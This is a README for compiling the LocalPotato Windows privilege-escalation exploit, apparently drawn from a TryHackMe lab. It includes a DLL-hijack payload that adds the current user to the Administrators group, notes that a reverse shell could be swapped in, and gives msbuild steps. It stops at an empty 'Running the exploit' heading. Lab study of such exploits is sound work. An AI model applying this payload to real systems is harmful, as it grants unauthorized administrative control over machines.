# LocalPotato
All the information to compile and execute these binaries comes from the [TryHackMe room for LocalPotato](https://tryhackme.com/room/localpotato)

## Compiling the Exploit

To make use of this exploit, you will first need to compile both of the provided files:

- SprintCSP.dll: This is the missing DLL we are going to hijack. The default code provided with the exploit will run the whoami command and output the response to `C:\Program Data\whoamiall.txt`. We will need to change the command to run a reverse shell.
- RpcClient.exe: This program will trigger the RPC call to `SvcRebootToFlashingMode`. Depending on the Windows version you are targeting, you may need to edit the exploit's code a bit, as different Windows versions use different interface identifiers to expose `SvcRebootToFlashingMode`.

Let's start by dealing with RpcClient.exe. As previously mentioned, we will need to change the exploit depending on the Windows version of the target machine. To do this, we will need to change the first lines of `RpcClient\RpcClient\storsvc_c.c` so that the correct operating system is chosen. We can use Notepad++ by right-clicking on the file and selecting Edit with Notepad++. Since our machine is running Windows Server 2019, we will edit the file to look as follows:

    #if defined(_M_AMD64)

    //#define WIN10
    //#define WIN11
    #define WIN2019
    //#define WIN2022

    ...

This will set the exploit to use the correct RPC interface identifier for Windows 2019. Now that the code has been corrected, let's open a developer's command prompt using the shortcut on your desktop. We will build the project by running the following commands:

    C:\> cd RpcClient
    C:\> msbuild RpcClient.sln
    ... some output ommitted ...

    Build succeeded.
      0 Warning(s)
      0 Error(s)

    C:\> move x64\Debug\RpcClient.exe C:\Users\user\Desktop\
    
The compiled executable will be found on your desktop.

Now to compile SprintCSP.dll, we only need to modify the `DoStuff()` function on `SprintCSP\SprintCSP\main.c` so that it executes a command that grants us privileged access to the machine. For simplicity, we will make the DLL add our current user to the Administrators group. Here's the code with our replaced command:

    void DoStuff() {

      // Replace all this code by your payload
      STARTUPINFO si = { sizeof(STARTUPINFO) };
      PROCESS_INFORMATION pi;
      CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
          NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

      CloseHandle(pi.hProcess);
      CloseHandle(pi.hThread);

      return;
    }
    
We now compile the DLL and move the result back to our desktop:

    C:\> cd SprintCSP\

    C:\> msbuild SprintCSP.sln
    ... some output ommitted ...

    Build succeeded.
        6 Warning(s)
        0 Error(s)

    C:\> move x64\Debug\SprintCSP.dll C:\Users\user\Desktop\
    
## Running the exploit
